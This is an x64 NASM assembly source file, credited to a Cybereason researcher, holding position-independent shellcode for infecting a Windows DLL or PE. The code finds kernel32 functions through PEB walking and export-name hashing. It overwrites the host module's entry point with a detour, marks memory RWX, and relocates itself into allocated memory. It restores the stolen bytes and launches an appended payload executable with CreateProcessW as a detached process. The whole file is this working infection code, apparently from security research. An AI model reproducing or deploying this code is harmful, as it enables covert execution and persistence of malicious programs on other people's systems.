; Written by Forrest Williams - forrest-RE@protonmail.com / forrest.williams@cybereason.com
; Copyright (C) 2017, Cybereason
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.

;%define DBG

%ifdef DBG

global x64CreateProcess

%endif

%include "Windows.inc"

qw_module_base               equ -8
qw_target_name_hash          equ -10h
qw_export_table              equ -18h
pdw_names_array              equ -20h
pw_name_ordinal_array        equ -28h
pdw_function_rva_array       equ -30h
qw_function_address          equ -38h
dw_export_table_size         equ -40h
qw_forwarded_module_base     equ -48h
forwarded_function_name      equ -150h ; 100h is 256, clean multiple of 8 for stack alignment.
forwarded_module_name        equ -250h
resolve_export_address64_stack_size equ 250h

aligned_startup_info64_size equ (STARTUPINFO64_size + 8)                       ; 68h on its own so we intentionally align it to 70h
aligned_process_info_size equ (PROCESS_INFORMATION64_size + 8)                 ; 18h on its own, align to 20h
target_path_buf_size equ (264 * 2)                                             ; MAX_PATH is 260 but we need an extra byte for the NULL terminator. 264 is the closest clean multiple of 8. Double the size for Unicode.

current_startup_info  equ -(aligned_startup_info64_size)
current_process_info  equ -(aligned_startup_info64_size + aligned_process_info_size)
target_buf_size       equ -(aligned_startup_info64_size + aligned_process_info_size + target_path_buf_size)
qw_old_protect        equ -(aligned_startup_info64_size + aligned_process_info_size + target_path_buf_size + 8)
qw_saved_rax          equ -(aligned_startup_info64_size + aligned_process_info_size + target_path_buf_size + 8 + 8)
main_stack_frame_size equ (aligned_startup_info64_size + aligned_process_info_size + target_path_buf_size + 8 + 8)

qw_return_address     equ 10h                                                  ; Would normally be +8, must consider RFlags in addition to the standard rbp
qw_exec_mode          equ 18h                                                  ; Parameter passed via the stack to the shellcode. 3 Quadwords deep: rbp, RFlags, return address
qw_rax_param          equ 20h

bits           64

%macro x64AlignStackM 0

sub            rsp, 8                                                          ; Subtract an additional Quadword from the stack pointer.
and            spl, 0F7h                                                       ; Align stack 11110111 (1000 is 8), spl is 8 bit rsp

%endmacro

%macro x64AlignCallM 1                                                         ; can only be used if there are less than 4 params otherwise we must have a definite knowledge of the stack subtraction size

push           rbp
mov            rbp, rsp
sub            rsp, 20h                                                        ; Minimum stack space for 4 default fastcall registers.
x64AlignStackM
call           %1
mov            rsp, rbp
pop            rbp

%endmacro

%ifdef         DBG

;Section .synthetic execute read write
Section .text

%else

Section .text

%endif

%ifdef         DBG

%define x64CreateProcess_Base x64CreateProcess.main

%else

%define x64CreateProcess_Base x64CreateProcess

%endif

x64CreateProcess:                                                              ; rcx = execution mode, zero = initial execution, nonzero = secondary execution

%ifdef         DBG

times 30 nop                                                                   ; Pad the entry point so that the synthetic first entry point (secondary exec context) detour can be written there without clobbering the synthetic first exec mode detour code
db 68h, 00h, 00h, 00h, 00h                                                     ; Force a 32 bit push
call           x64CreateProcess.main
;db 68h, 01h, 00h, 00h, 00h                                                    ; Force a 32 bit push
jmp            x64CreateProcess                                                ; Used for testing, should produce a 32 bit jmp rather than an 8 bit one due to distance. Will cause a crash, this is only here for testing.

.main:

%endif

pushfq
push           rbp                                                             ; Normally any function including this one should be called with a 10h alignment in x64 which after the return address is pushed will be 8. In case we're not already aligned subtract another qword and filter off 8 bit.
mov            rbp, rsp
sub            rsp, main_stack_frame_size
x64AlignStackM
push           rax
push           rcx
push           rdx
push           rbx
push           rsi
push           rdi
push           R8
push           R9
push           R10
push           R11
push           R12
push           R13
push           R14
push           R15
mov            edi, dword [gs:TIB64.LastError]
call           x64CreateProcess.get_rip

.get_rip:

pop            rsi
sub            rsi, (x64CreateProcess.get_rip - x64CreateProcess_Base)         ; get the shellcode base and store it in rsi.
mov            rcx, 0D4E88h                                                    ; kernel32.dll string hash. The hashing algorithm is case insensitive (forced uppercase)
call           get_module_base64
test           rax, rax
jz             x64CreateProcess.restore_state
mov            R12, rax                                                        ; R12-15 are non-volatile
mov            rdx, 38d13ch                                                    ; VirtualProtect
mov            rcx, R12
call           resolve_export_address64
test           rax, rax
jz             x64CreateProcess.restore_state
mov            R14, rax
cmp            qword [rbp + qw_exec_mode], 0
jne            x64CreateProcess.secondary_exec_context                         ; Otherwise we are in the first exec context. The purpose of this context is to relocate itself elsewhere in virtual memory (doing this will prevent this code from vanishing if the infected DLL is unloaded). The moved shellcode will be called by a detour from the orig entry point. This is because neither LoadLibrary or CreateProcess can be safely called from within DllMain.
mov            qword [rbp + qw_old_protect], 0
lea            R9, qword [rbp + qw_old_protect]                                ; lpflOldProtect
mov            R8, PAGE_EXECUTE_READWRITE                                      ; flNewProtect
mov            rdx, (writable_shellcode_buf_end - writable_shellcode_buf)      ; dwSize
mov            rcx, rsi
add            rcx, (writable_shellcode_buf - x64CreateProcess_Base)           ; lpAddress
x64AlignCallM  R14                                                             ; Use VirtualProtect to change the stolen bytes buffer within this shellcode (which could be embedded in a non-writable section of an infected PE) to writable
test           al, al
jz             x64CreateProcess.restore_state                                ; Don't risk causing an exception by writing to the current shellcode body if the memory protection change failed
call           get_primary_module_ep64
mov            qword [rbp + qw_old_protect], 0
lea            R9, qword [rbp + qw_old_protect]                                ; lpflOldProtect
mov            R8, PAGE_EXECUTE_READWRITE                                      ; flNewProtect
mov            rdx, (primary_module_stolen_bytes.end - primary_module_stolen_bytes.start) ; dwSize
mov            rcx, rax                                                        ; lpAddress
x64AlignCallM  R14                                                             ; Use VirtualProtect to change the orig entry point (likely to be in a read/exec .text section) to writable
test           al, al
jz             x64CreateProcess.restore_state                                ; Don't risk causing an exception by writing to the orig entry point if the memory protection change failed
mov            rdx, 0e3142h                                                    ; VirtualAlloc
mov            rcx, R12
call           resolve_export_address64                                        ; Resolve VirtualAlloc and allocate a chunk of memory representing the full size of this shellcode. The full size must be obtained dynamically since the path string can vary in length.
test           rax, rax
jz             x64CreateProcess.restore_state
mov            R13, rax
mov            rdx, 1                                                          ; Unicode boolean
mov            rcx, rsi
add            rcx, (target_exe_path - x64CreateProcess_Base)
call           get_string_len64
inc            rax
add            rax, rax                                                        ; Multiply by two in order to get the full size of the string in bytes
add            rax, (target_exe_path - x64CreateProcess_Base)                  ; rax now holds the full shellcode size, including the path string appended to it
mov            R15, rax                                                        ; Save the dynamically calculated shellcode size up to the end of the path string. This also serves as an offet to the stolen bytes appended to the end.
add            R15, rsi
add            ax, word [R15]                                                  ; Add the stolen bytes length
add            rax, 2                                                          ; Include the size of the length word itself in the full shellcode size
push           rax
mov            R9, PAGE_EXECUTE_READWRITE
mov            R8, (MEM_COMMIT | MEM_RESERVE)
mov            rdx, rax                                                        ; Size
xor            rcx, rcx                                                        ; Initial pointer can be NULL
x64AlignCallM  R13                                                             ; Copy the full shellcode in to the +rwx virtual memory
mov            R13, rax                                                        ; R13 now holds the relocated shellcode base
pop            rcx                                                             ; Shellcode size
push           rsi                                                             ; rsi should already be equal to the current shellcode base, but since Movsb may modify it, preserve it.
push           rdi
mov            rdi, rax
rep            movsb                                                           ; Move rcx bytes from rsi to rdi
pop            rdi
pop            rsi
push           rsi                                                             ; Save the stolen byte(s) to the relocated shellcode body. It's essential the stolen bytes data in the original shellcode is preserved as it contains the detour bytes.
push           rdi
call           get_primary_module_ep64
mov            rdi, R13
add            rdi, (primary_module_stolen_bytes.start - x64CreateProcess_Base)
mov            rcx, (primary_module_stolen_bytes.end - primary_module_stolen_bytes.start)    
mov            rsi, rax
rep            movsb                                                           ; Move rcx bytes from rsi to rdi
pop            rdi
pop            rsi
call           get_primary_module_ep64
push           rsi
push           rdi
mov            rdi, rax
add            rsi, (primary_module_stolen_bytes.start - x64CreateProcess_Base)        ; Copy detour bytes from original (non-relocated) shellcode. The relocated shellcode contains the stolen bytes.
mov            rcx, (primary_module_stolen_bytes.end - primary_module_stolen_bytes.start)    
rep            movsb                                                           ; Move rcx bytes from rsi to rdi
pop            rdi
pop            rsi
mov            qword [rax + 8], R13                                            ; Fill out absolute address in mov rax, XX XX XX XX XX XX XX XX : 48 B8 XX XX XX XX XX XX XX XX
xor            rcx, rcx                                                        ; Retrieve the infected module orig entry using the return address on the stack pushed by our detour.
mov            cx, word [R15]
mov            rax, qword [rbp + qw_return_address]
sub            rax, rcx
mov            R12, rax                                                        ; Clobber kernel32.dll base address with infected module DllMain.
mov            R13, rcx                                                        ; Clobber relocated shellcode address with stolen infected module bytes size.
mov            qword [rbp + qw_old_protect], 0
lea            R9, qword [rbp + qw_old_protect]                                ; lpflOldProtect
mov            R8, PAGE_EXECUTE_READWRITE                                      ; flNewProtect
mov            rdx, rcx                                                        ; dwSize
mov            rcx, R12                                                        ; lpAddress
x64AlignCallM  R14                                                             ; Use VirtualProtect to change the infected module orig entry DllMain to writable.
test           al, al
jz             x64CreateProcess.restore_state   
push           rsi
push           rdi
mov            rsi, R15                                                        ; R15 holds the offset to the stolen bytes buffer (including size word)
add            rsi, 2
mov            rcx, R13
mov            rdi, R12
rep            movsb                                                           ; Restore stolen bytes to the entry point of the current module that currently contains the detour which called this shellcode
pop            rdi
pop            rsi
mov            rcx, R13
jmp            x64CreateProcess.restore_state

.secondary_exec_context:                                                       ; In this secondary execution context we can assume we are executing from +rwx virtual memory in an independent thread not associated with the Windows Loader.

mov            rdx, 33cfc2h                                                    ; CreateProcessW, the Unicode variant is specifically chosen despite its larger shellcode size (string will be twice the size) to give compatability on non-English systems.
mov            rcx, R12
call           resolve_export_address64
test           rax, rax
jz             x64CreateProcess.restore_state
mov            R13, rax   
push           rdi
push           rsi
lea            rdi, qword [rbp + target_buf_size]                        
add            rsi, (target_exe_path - x64CreateProcess_Base)                  ; Use RIP to find the target executable path string at the end of this shellcode then copy it on to a local stack buffer. It is essential that we do this, since CreateProcess will often attempt to write to this value and we can't assume the section this shellcode is stored in will be +w
mov            rdx, 1                                                          ; Unicode boolean
mov            rcx, rsi
call           get_string_len64
inc            rax                                                             ; Include null terminator since we cannot assume the stack will be filled with 0's
add            rax, rax                                                        ; Multiply the string length by two in order to determine the size of the Unicode string in bytes
mov            rcx, rax
rep            movsb                                                           ; Move rcx bytes from rsi to rdi: copy the Unicode path string of the target payload file to a local stack buffer
pop            rsi
pop            rdi
mov            rdx, aligned_startup_info64_size
lea            rcx, qword [rbp + current_startup_info]
call           wipe_mem64
mov            rdx, rcx
mov            dword [rdx + STARTUPINFO64.cb], STARTUPINFO64_size              ; We avoid the aligned structure size in this case we want the plain size (68h)
lea            rbx, qword [rbp + current_process_info]
sub            rsp, 50h
xor            rcx, rcx                                                        ; Optimization - also serves as 1st param lpApplicationName
mov            qword [rsp + 48h], rbx                                          ; lpProcessInformation
mov            qword [rsp + 40h], rdx                                          ; lpStartupInfo
mov            qword [rsp + 38h], rcx                                          ; lpCurrentDirectory
mov            qword [rsp + 30h], rcx                                          ; lpEnvironment
mov            qword [rsp + 28h], DETACHED_PROCESS                             ; dwCreationFlags
mov            qword [rsp + 20h], rcx                                          ; bInheritHandles
xor            R9, R9
xor            R8, R8
lea            rdx, qword [rbp + target_buf_size]
;mov            rdx, target_exe_path
call           R13
add            rsp, 50h
push           rsi                                                             ; Restore stolen bytes to original entry point and modify the return address on the stack so that the stolen bytes will be executed upon return from this shellcode
push           rdi
call           get_primary_module_ep64
add            rsi, (primary_module_stolen_bytes.start - x64CreateProcess_Base)
mov            rcx, (primary_module_stolen_bytes.end - primary_module_stolen_bytes.start)    
mov            rdi, rax
rep            movsb                                                           ; Move rcx bytes from rsi to rdi
pop            rdi
pop            rsi

%ifdef         DBG

mov            rcx, qword [rbp + qw_return_address]                            ; get the return address of the caller for this function. There is a 2 qword distance between rbp and the return address since not only rbp is saved, but also RFlags
mov            byte [rcx], 0C3h                                                ; Write a 'ret' directly on top of the restored stolen bytes (these will be nops) so that instead of looping all over again ExitProcess is called via return from orig entry.

%endif

mov            rcx, (primary_module_stolen_bytes.end - primary_module_stolen_bytes.start)

.restore_state:

sub            qword [rbp + qw_return_address], rcx                            ; Adjust return address to point to the original entry point rather than the next instruction after the (now overwritten) detour hook
mov            dword [gs:TIB64.LastError], edi
pop            R15                                                             ; Restore initial state. If this is the secondary execution rax will have been clobbered by the detour itself and must be restored from the stack.
pop            R14
pop            R13
pop            R12
pop            R11
pop            R10
pop            R9
pop            R8
pop            rdi
pop            rsi
pop            rbx
pop            rdx
pop            rcx
pop            rax
cmp            qword [rbp + qw_exec_mode], 0
je             x64CreateProcess.primary_finish

.secondary_finish:

mov            rax, qword [rbp + qw_rax_param]                                 ; Restore rax, which was clobbered in order to execute a 'call rax' instruction in the secondary exec detour
mov            rsp, rbp
pop            rbp
popfq
retn           10h

.primary_finish:

mov            rsp, rbp
pop            rbp
popfq
retn           8

get_primary_module_ep64:

push           rdi
push           rsi
mov            rsi, TIB64.pPEB
gs             lodsq
mov            rdi, qword [rax + PEB64.pImageBase]
mov            rcx, rdi                                                        ; get the absolute address of the module EP using its PE header
xor            rbx, rbx
mov            ebx, dword [rdi + IMAGE_DOS_HEADER.e_lfanew]
add            rcx, rbx
add            rcx, (IMAGE_FILE_HEADER_size + 4)
xor            rbx, rbx
mov            ebx, dword [rcx + IMAGE_OPTIONAL_HEADER64.AddressOfEntryPoint]
add            rbx, rdi
mov            rax, rbx
pop            rsi
pop            rdi
ret

wipe_mem64:                                                                    ; rcx = pointer to target buffer, rdx = length

mov            rax, -1

.zero_next_byte:

inc            rax
cmp            rax, rdx
je             wipe_mem64.wipe_finish
mov            byte [rcx + rax], 0
jmp            wipe_mem64.zero_next_byte

.wipe_finish:

ret

get_string_len64:                                                              ; rcx = target string pointer, rdx = boolean yes unicode or no unicode

inc            rdx                                                             ; rdx goes from being a boolean to being the char size (0 to 1 for ANSI, 1 to 2 for Unicode)
xor            rax, rax                                                        ; Length counter. This is the number of chars (excluding the terminator) not the number of bytes.

.count_next_char:

cmp            byte [rcx], 0
je             get_string_len64.finish
add            rcx, rdx
inc            rax
jmp            get_string_len64.count_next_char

.finish:

ret

get_module_base64:                                                             ; rcx = the string hash of the target module base name (not full path)

push           R8                                                              ; Walk through the load order module list in the PEB by flink until either the first module in the list (ntdll.dll) is reached again or a NULL entry is identified.
push           rdi
push           rsi
mov            R8, rcx
mov            rsi, TIB64.pPEB
gs             lodsq
mov            rax, qword [rax + PEB64.pLDRData]
mov            rdi, qword [rax + PEB_LDR_DATA64.pInLoadOrderModuleList]
mov            rsi, rdi                                                        ; rsi will be my moving module entry pointer, while rdi will be a static reference to the initial load order module (should always be ntdll.dll)
xor            rax, rax                                                        ; If the list pointer is invalid we still need to return 0.
jmp            get_module_base64.check_valid_module                            ; rsi and rdi will be equal when the loop begins, skip the ntdll check on the first iteration.

.check_next_module:                                                            ; rsi = current module, rdi = ntdll module, R8 = target module name hash. rax will be the module base after loop exits assuming it was ever found

cmp            rdi, rsi
je             get_module_base64.final_module

.check_valid_module:

test           rsi, rsi
jz             get_module_base64.final_module
lea            rbx, qword [rsi + LDR_MODULE64.usBaseDllName]
test           rbx, rbx
jz             get_module_base64.load_next_module_entry
mov            rdx, 1                                                          ; Unicode string boolean
mov            rcx, qword [rbx + UNICODE_STRING64.Buffer]
test           rcx, rcx
jz             get_module_base64.load_next_module_entry
call           get_string_hash64
cmp            rax, R8
je             get_module_base64.found_target_module

.load_next_module_entry:

xor            rax, rax                                                        ; This will ensure we return 0 in the event the target module is not found.
mov            rsi, qword [rsi + LDR_MODULE64.Flink]
jmp            get_module_base64.check_next_module

.found_target_module:

mov            rax, qword [rsi + LDR_MODULE64.pBase]

.final_module:

pop            rsi
Pop			   rdi
pop            R8
ret

get_string_hash64:                                                             ; rcx = pointer to string, rdx = boolean yes unicode or no unicode

push           rdi
mov            rdi, rdx
xor            rbx, rbx

.hash_next_byte:

cmp            byte [rcx], 0
je             get_string_hash64.hash_generated
movzx          eax, byte [rcx]
or             al, 60h
Movzx          edx, al
add            ebx, edx
shl            rbx, 1
inc            rcx
test           rdi, rdi
jz             get_string_hash64.hash_next_byte
inc            rcx                                                             ; Skip an extra byte if this is a unicode string
jmp            get_string_hash64.hash_next_byte

.hash_generated:

mov            rax, rbx
pop            rdi
Ret

resolve_export_address64:

bits           64
push           rbp
mov            rbp, rsp
sub            rsp, resolve_export_address64_stack_size
push           rdi
push           rsi
mov            qword [rbp + qw_module_base], rcx
mov            qword [rbp + qw_target_name_hash], rdx
xor            rbx, rbx
mov            ebx, dword [rcx + IMAGE_DOS_HEADER.e_lfanew]
add            rcx, rbx
add            rcx, (IMAGE_FILE_HEADER_size + 4)
mov            rsi, qword [rbp + qw_module_base]
xor            rbx, rbx
mov            ebx, dword [rcx + IMAGE_OPTIONAL_HEADER64.DataDirectory]
add            rsi, rbx
mov            qword [rbp + qw_export_table], rsi
mov            eax, dword [rcx + IMAGE_OPTIONAL_HEADER64.DataDirectory + 4]    ; Size field in first data directory (export address table)
mov            dword [rbp + dw_export_table_size], eax
mov            rax, qword [rbp + qw_module_base]
mov            ebx, dword [rsi + IMAGE_EXPORT_DIRECTORY.AddressOfNames]
add            rax, rbx
mov            qword [rbp + pdw_names_array], rax
mov            rax, qword [rbp + qw_module_base]
xor            rbx, rbx
mov            ebx, dword [rsi + IMAGE_EXPORT_DIRECTORY.AddressOfNameOrdinals]
add            rax, rbx
mov            qword [rbp + pw_name_ordinal_array], rax
mov            rax, qword [rbp + qw_module_base]
mov            ebx, dword [rsi + IMAGE_EXPORT_DIRECTORY.AddressOfFunctions]
add            rax, rbx
mov            qword [rbp + pdw_function_rva_array], rax
xor            rsi, rsi
mov            qword [rbp + qw_function_address], rsi

.get_func_name:                                                                ; rsi = Current function index (should be initialized to 0)

mov            rax, qword [rbp + qw_export_table]
mov            eax, dword [rax + IMAGE_EXPORT_DIRECTORY.NumberOfNames]
cmp            rax, rsi
Jbe            resolve_export_address64.return_hash
mov            rax, rsi
lea            rcx, qword [rax * 4]
mov            rdx, qword [rbp + pdw_names_array]
mov            rax, qword [rbp + qw_module_base]
mov            ebx, dword [rcx + rdx]
add            rax, rbx
xor            rdx, rdx                                                        ; Set Unicode boolean to false, function names are always ANSI from the export address table
mov            rcx, rax
call           get_string_hash64
cmp            eax, dword [rbp + qw_target_name_hash]                          ; Explicitly check 32 bits, otherwise long function names may produce hashes which require 64 bits.
jnz            resolve_export_address64.next_func_name
mov            rax, rsi
lea            rdx, dword [rax + rax]
mov            rax, qword [rbp + pw_name_ordinal_array]
movzx          rax, word [rdx + rax]
lea            rcx, qword [rax * 4]
mov            rdx, qword [rbp + pdw_function_rva_array]
mov            rax, qword [rbp + qw_module_base]
mov            ebx, dword [rcx + rdx]
add            rax, rbx
mov            qword [rbp + qw_function_address], rax                          ; We've resolved the address of the target function. However this may be a forwarder string, not code. Check and see if the address is within the export table to determine this.
mov            rcx, qword [rbp + qw_export_table]
mov            rdx, rcx
xor            rbx, rbx
mov            ebx, dword [rbp + dw_export_table_size]
add            rdx, rbx
cmp            rax, rcx
jl             resolve_export_address64.return_hash                            ; func address below the start of the export table? If so it's a legit function.
cmp            rax, rdx
jge            resolve_export_address64.return_hash                            ; Function address above the end of the export table? If so it's a legit function in this context.
mov            qword [rbp + qw_function_address], 0                            ; The function address falls within the export table. We can assume that it is a forwarder. Extract the module/function name: <Module name (no extension)>.<Function name>
xor            rcx, rcx ; Forwarder string counter
lea            rbx, qword [rbp + forwarded_module_name]                        ; at first the buffer register will point to the module name since this field comes first.

.extract_forwarder:

mov            dl, byte [rax + rcx]
cmp            dl, 0
je             resolve_export_address64.resolve_forwarder
cmp            dl, '.'
jne            resolve_export_address64.next_forwarder_byte
mov            dword [rbx], '.dll'                                             ; The module name in a forwarder will not include a .dll extension. Add it so that we can generate a name hash which may match a module in the PEB loader list.
add            rbx, 4
mov            byte [rbx], 0                                                   ; Finalize module name string with null terminator
lea            rbx, qword [rbp + forwarded_function_name]                      ; Switch the buffer register and begin building the function string
inc            rcx ; Skip the '.' seperator
jmp            resolve_export_address64.extract_forwarder

.next_forwarder_byte:

mov            byte [rbx], dl
inc            rcx
inc            rbx
jmp            resolve_export_address64.extract_forwarder

.resolve_forwarder:

mov            byte [rbx], 0                                                   ; end the function name string with a null terminator.
;lea            rdx, qword [rbp + forwarded_function_name]
xor            rdx, rdx
lea            rcx, qword [rbp + forwarded_module_name]
call           get_string_hash64
mov            rcx, rax
call           get_module_base64
test           rax, rax
jz             resolve_export_address64.return_hash                            ; Failed to find the forwarded module in the PEB loader list. This could be because it is an API set (and these will never be in the list) or a module which simply has not been loaded yet.
mov            qword [rbp + qw_forwarded_module_base], rax
xor            rdx, rdx
lea            rcx, qword [rbp + forwarded_function_name]
call           get_string_hash64
mov            rdx, rax
mov            rcx, qword [rbp + qw_forwarded_module_base]
call           resolve_export_address64
mov            qword [rbp + qw_function_address], rax
jmp            resolve_export_address64.return_hash

.next_func_name:

inc            rsi
jmp            resolve_export_address64.get_func_name

.return_hash:

mov            rax, qword [rbp + qw_function_address]
pop            rsi
pop            rdi
mov            rsp, rbp
pop            rbp
ret

;align 16

writable_shellcode_buf:

primary_module_stolen_bytes:

.start:

; 50                       | push rax
; 68 01 00 00 00           | push 1
; 48 B8 34 12 6F 5E 4D 3C  | movabs rax,1A2B3C4D5E6F1234
; FF D0                    | call rax

push           rax
db 68h, 01h, 00h, 00h, 00h                                                     ; Force a 32 bit push
mov            rax, 1A2B3C4D5E6F1234h                                          ; This will be replaced by the absolute address of the OEP at runtime. rax is used because we can safely assume it is equal to the OEP absolute address on the initial threat context of the OEP
call           rax                                                             ; This is specifically chosen over an E8 relative call since we cannot assume the distance between the original entry and relocated shellcode can be encoded in 32 bits.

.end:

target_exe_path:

%ifdef         DBG

dw 'T', 'e', 's', 't', 'E', 'X', 'E', '.', 'e', 'x', 'e', 0

%endif

writable_shellcode_buf_end:

infected_module_stolen_bytes:                                                  ; The bytes that were overwritten by the detour which called the first shellcode execution mode

%ifdef         DBG

dw 0Ah                                                                         ; Size (this will be filled in when this shellcode is generated)
;...

times 10 nop ; In debug we can just use nops as our fake stolen bytes. 5 for the push 5 for the call

%endif

End:
